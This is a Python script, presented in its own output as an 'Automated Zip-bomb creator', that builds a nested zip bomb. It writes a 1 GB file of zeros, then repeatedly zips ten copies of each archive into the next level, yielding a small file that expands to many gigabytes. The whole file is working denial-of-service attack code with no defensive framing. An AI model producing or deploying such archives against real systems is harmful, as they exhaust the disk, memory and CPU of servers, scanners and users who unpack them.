import zlib
import zipfile
import shutil
import os
import sys
import time


def get_file_size(filename):
    st = os.stat(filename)
    return st.st_size


def generate_dummy_file(filename, size):
    with open(filename, "w") as dummy:
        for i in range(1024):
            dummy.write((size * 1024 * 1024) * "0")


def get_filename_without_extension(name):
    return name[: name.rfind(".")]


def get_extension(name):
    return name[name.rfind(".") + 1 :]


def compress_file(infile, outfile):
    zf = zipfile.ZipFile(outfile, mode="w", allowZip64=True)
    zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)
    zf.close()


def make_copies_and_compress(infile, outfile, n_copies):
    zf = zipfile.ZipFile(outfile, mode="w", allowZip64=True)
    for i in range(n_copies):
        f_name = "%s-%d.%s" % (
            get_filename_without_extension(infile),
            i,
            get_extension(infile),
        )
        shutil.copy(infile, f_name)
        zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
        os.remove(f_name)
    zf.close()


if __name__ == "__main__":
    print("Automated Zip-bomb creator starting.")
    if len(sys.argv) < 3:
        print("No arguments detected - Usage:\n")
        print(" zipbomb.py n_levels out_zip_file")
        exit()
    print("Defining 'n_levels'...")
    n_levels = int(sys.argv[1])
    print("Defined 'n_levels.'")
    print("Defining out_zip_file.")
    out_zip_file = sys.argv[2]
    print("Defined 'out_zip_file.'")
    print("Defining 'dummy_name.'")
    dummy_name = "dummy.txt"
    print("Defined 'dummy_name.'")
    print("Beginning zip creation.")
    start_time = time.time()
    print("Generating dummy text file.")
    generate_dummy_file(dummy_name, 1)
    print("Created dummy file.")
    level_1_zip = "1.zip"
    print("Created level 1 zip file.")
    compress_file(dummy_name, level_1_zip)
    print("Compressed level 1 zip file.")
    os.remove(dummy_name)
    decompressed_size = 1
    for i in range(1, n_levels + 1):
        print(f"Now creating level {i}.")
        make_copies_and_compress("%d.zip" % i, "%d.zip" % (i + 1), 10)
        print(f"Making copies and compressing for level {i}.")
        decompressed_size *= 10
        print(f"Finishing level {i}.")
        os.remove("%d.zip" % i)
        print(f"Zipbomb level {i} completed.")
    if os.path.isfile(out_zip_file):
        os.remove(out_zip_file)
    os.rename("%d.zip" % (n_levels + 1), out_zip_file)
    print("Zip creation finished.")
    end_time = time.time()
    print("Compressed File Size: %.2f KB" % (get_file_size(out_zip_file) / 1024.0))
    print("Size After Decompression: %d GB" % decompressed_size)
    print("Generation Time: %.2fs" % (end_time - start_time))